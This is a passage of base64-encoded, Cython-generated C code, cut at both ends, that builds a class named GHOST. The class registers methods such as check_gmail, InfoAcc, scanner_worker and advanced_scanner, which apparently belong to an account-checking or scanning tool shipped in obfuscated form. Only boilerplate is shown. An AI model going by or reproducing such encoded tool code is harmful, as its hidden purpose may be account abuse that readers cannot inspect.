91X0NvbG9ycyk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDQ1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gIF9fcHl4X3RfNyA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTtcbiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMS1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDUsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICB9XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQywgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5M01ldGFjbGFzc1ByZXBhcmUoKFB5T2JqZWN0ICopIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HSE9TVCwgKFB5T2JqZWN0ICopIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90dCwgKFB5T2JqZWN0ICopIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0OCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuXG4gIFxuICBfX3B5eF90XzggPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ydHRfNUdIT1NUXzFfX2luaXRfXywgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dIT1NUX19faW5pdCwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3R0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNF0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEUwMDAwXG4gIFB5VW5zdGFibGVfT2JqZWN0X0VuYWJsZURlZmVycmVkUmVmY291bnQoX19weXhfdF84KTtcbiAgI2VuZGlmXG4gIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbml0LCBfX3B5eF90XzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcblxuICBcbiAgX19weXhfdF84ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnR0XzVHSE9TVF8zaW5jcmVtZW50X2NvdW50ZXIsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HSE9TVF9pbmNyZW1lbnRfY291bnRlciwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3R0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNV0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNjcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEUwMDAwXG4gIFB5VW5zdGFibGVfT2JqZWN0X0VuYWJsZURlZmVycmVkUmVmY291bnQoX19weXhfdF84KTtcbiAgI2VuZGlmXG4gIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmNyZW1lbnRfY291bnRlciwgX19weXhfdF84KSA8ICgwKSkgX19QWVhfRVJSKDAsIDY3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfOCA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJ0dF81R0hPU1RfNXNldF9hY3RpdmVfdGhyZWFkcywgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dIT1NUX3NldF9hY3RpdmVfdGhyZWFkcywgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3R0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNl0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEUwMDAwXG4gIFB5VW5zdGFibGVfT2JqZWN0X0VuYWJsZURlZmVycmVkUmVmY291bnQoX19weXhfdF84KTtcbiAgI2VuZGlmXG4gIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZXRfYWN0aXZlX3RocmVhZHMsIF9fcHl4X3RfOCkgPCAoMCkpIF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuXG4gIFxuICBfX3B5eF90XzggPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ydHRfNUdIT1NUXzdnZXRfY291bnRlciwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dIT1NUX2dldF9jb3VudGVyLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls3XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA3NSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwRTAwMDBcbiAgUHlVbnN0YWJsZV9PYmplY3RfRW5hYmxlRGVmZXJyZWRSZWZjb3VudChfX3B5eF90XzgpO1xuICAjZW5kaWZcbiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldF9jb3VudGVyLCBfX3B5eF90XzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgNzUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcblxuICBcbiAgX19weXhfdF84ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnR0XzVHSE9TVF85Y3JlYXRlX2Jhbm5lciwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dIT1NUX2NyZWF0ZV9iYW5uZXIsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzhdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBFMDAwMFxuICBQeVVuc3RhYmxlX09iamVjdF9FbmFibGVEZWZlcnJlZFJlZmNvdW50KF9fcHl4X3RfOCk7XG4gICNlbmRpZlxuICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY3JlYXRlX2Jhbm5lciwgX19weXhfdF84KSA8ICgwKSkgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfOCA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJ0dF81R0hPU1RfMTF0bGwsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HSE9TVF90bGwsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzldKSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBFMDAwMFxuICBQeVVuc3RhYmxlX09iamVjdF9FbmFibGVEZWZlcnJlZFJlZmNvdW50KF9fcHl4X3RfOCk7XG4gICNlbmRpZlxuICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGxsLCBfX3B5eF90XzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcblxuICBcbiAgX19weXhfdF84ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnR0XzVHSE9TVF8xM2NoZWNrX2dtYWlsLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1RfY2hlY2tfZ21haWwsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzEwXSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxMTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEUwMDAwXG4gIFB5VW5zdGFibGVfT2JqZWN0X0VuYWJsZURlZmVycmVkUmVmY291bnQoX19weXhfdF84KTtcbiAgI2VuZGlmXG4gIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaGVja19nbWFpbCwgX19weXhfdF84KSA8ICgwKSkgX19QWVhfRVJSKDAsIDExOSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuXG4gIFxuICBfX3B5eF90XzggPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ydHRfNUdIT1NUXzE1Y2hlY2ssIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HSE9TVF9jaGVjaywgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3R0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTFdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE3NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwRTAwMDBcbiAgUHlVbnN0YWJsZV9PYmplY3RfRW5hYmxlRGVmZXJyZWRSZWZjb3VudChfX3B5eF90XzgpO1xuICAjZW5kaWZcbiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NoZWNrLCBfX3B5eF90XzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTc0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfOCA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJ0dF81R0hPU1RfMTdyZXN0LCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1RfcmVzdCwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3R0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTJdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDIyMiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwRTAwMDBcbiAgUHlVbnN0YWJsZV9PYmplY3RfRW5hYmxlRGVmZXJyZWRSZWZjb3VudChfX3B5eF90XzgpO1xuICAjZW5kaWZcbiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Jlc3QsIF9fcHl4X3RfOCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMjIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcblxuICBcbiAgX19weXhfdF84ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnR0XzVHSE9TVF8xOWRhdGUsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HSE9TVF9kYXRlLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxM10pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMjYzLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBFMDAwMFxuICBQeVVuc3RhYmxlX09iamVjdF9FbmFibGVEZWZlcnJlZFJlZmNvdW50KF9fcHl4X3RfOCk7XG4gICNlbmRpZlxuICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0ZSwgX19weXhfdF84KSA8ICgwKSkgX19QWVhfRVJSKDAsIDI2MywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuXG4gIFxuICBfX3B5eF90XzggPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ydHRfNUdIT1NUXzIxSW5mb0FjYywgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dIT1NUX0luZm9BY2MsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE0XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAyOTEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEUwMDAwXG4gIFB5VW5zdGFibGVfT2JqZWN0X0VuYWJsZURlZmVycmVkUmVmY291bnQoX19weXhfdF84KTtcbiAgI2VuZGlmXG4gIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JbmZvQWNjLCBfX3B5eF90XzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjkxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfOCA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJ0dF81R0hPU1RfMjNnZW5lcmF0ZV91c2VyX2lkLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1RfZ2VuZXJhdGVfdXNlcl9pZCwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3R0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTVdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDM1OCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwRTAwMDBcbiAgUHlVbnN0YWJsZV9PYmplY3RfRW5hYmxlRGVmZXJyZWRSZWZjb3VudChfX3B5eF90XzgpO1xuICAjZW5kaWZcbiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmVyYXRlX3VzZXJfaWQsIF9fcHl4X3RfOCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNTgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcblxuICBcbiAgX19weXhfdF84ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnR0XzVHSE9TVF8yNXNjYW5uZXJfd29ya2VyLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1Rfc2Nhbm5lcl93b3JrZXIsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE2XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAzNjIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEUwMDAwXG4gIFB5VW5zdGFibGVfT2JqZWN0X0VuYWJsZURlZmVycmVkUmVmY291bnQoX19weXhfdF84KTtcbiAgI2VuZGlmXG4gIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zY2FubmVyX3dvcmtlciwgX19weXhfdF84KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM2MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuXG4gIFxuICBfX3B5eF90XzggPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ydHRfNUdIT1NUXzI3Y3JlYXRlX2Rhc2hib2FyZCwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dIT1NUX2NyZWF0ZV9kYXNoYm9hcmQsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE3XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MTQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEUwMDAwXG4gIFB5VW5zdGFibGVfT2JqZWN0X0VuYWJsZURlZmVycmVkUmVmY291bnQoX19weXhfdF84KTtcbiAgI2VuZGlmXG4gIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jcmVhdGVfZGFzaGJvYXJkLCBfX3B5eF90XzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDE0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfOCA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJ0dF81R0hPU1RfMjlhZHZhbmNlZF9zY2FubmVyLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1RfYWR2YW5jZWRfc2Nhbm5lciwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3R0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMThdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwRTAwMDBcbiAgUHlVbnN0YWJsZV9PYmplY3RfRW5hYmxlRGVmZXJyZWRSZWZjb3VudChfX3B5eF90XzgpO1xuICAjZW5kaWZcbiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FkdmFuY2VkX3NjYW5uZXIsIF9fcHl4X3RfOCkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MjQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcblxuICBcbiAgX19weXhfdF84ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnR0XzVHSE9TVF8zMXJ1biwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dIT1NUX3J1biwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3R0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTldKSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDQ1OCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwRTAwMDBcbiAgUHlVbnN0YWJsZV9PYmplY3RfRW5hYmxlRGVmZXJyZWRSZWZjb3VudChfX3B5eF90XzgpO1xuICAjZW5kaWZcbiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3J1biwgX19weXhfdF84KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ1OCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuXG4gIFxuICBfX3B5eF90XzggPSBfX1B5eF9QeTNDbGFzc0NyZWF0ZSgoKFB5T2JqZWN0KikmUHlUeXBlX1R5cGUpLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBfX3B5eF90XzIsIE5VTEwsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0OCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fS